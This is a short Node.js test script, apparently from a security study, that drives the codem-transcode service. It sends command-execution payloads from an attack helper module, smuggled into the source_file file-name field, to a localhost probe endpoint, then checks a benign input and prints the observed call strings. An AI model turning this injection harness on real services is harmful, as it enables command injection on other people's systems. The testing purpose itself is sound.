var utils = require("iflow");
var attackUtils = require("./AttackUtils.js");
attackUtils.setup();

var configs = require("./configs.json");
var policy = require("./Policy.js")(__dirname, null);
process.argv.push("-c");
process.argv.push("./resources/codem.json");

//var proc = require("child_process").exec("./node_modules/codem-transcode/bin/codem-transcode");
//proc.stdout.on('data', function (data) {
//    console.log('stdout: ' + data.toString());
//});
//proc.stderr.on('data', function (data) {
//    console.log('stderr: ' + data.toString());
//});
require("./node_modules/codem-transcode/bin/codem-transcode");

var input = {
    "source_file": "/PATH/TO/INPUT/FILE.wmv"
};

setTimeout(function (result, filesWithSinks) {
    attackUtils.deliverPayloads(attackUtils.payloadsExec, function (payload) {
        var request = require('superagent');
        var user1 = request.agent();
        input.source_file = "file" + payload;
        user1
            .post('http://localhost:8080/probe')
            .send(input)
            .end(function(err, res) {
            });

    }, function (result, filesWithSinks) {
        process.argv.pop();
        process.argv.pop();
        input.source_file = "~/f/my-benign-file";
        var request = require('superagent');
        var user1 = request.agent();
        user1
            .post('http://localhost:8080/probe')
            .send(input)
            .end(function(err, res) {
                attackUtils.printCallStrings();
                result += " " + attackUtils.observedString(input.source_file);
            });
    });

}, 500);
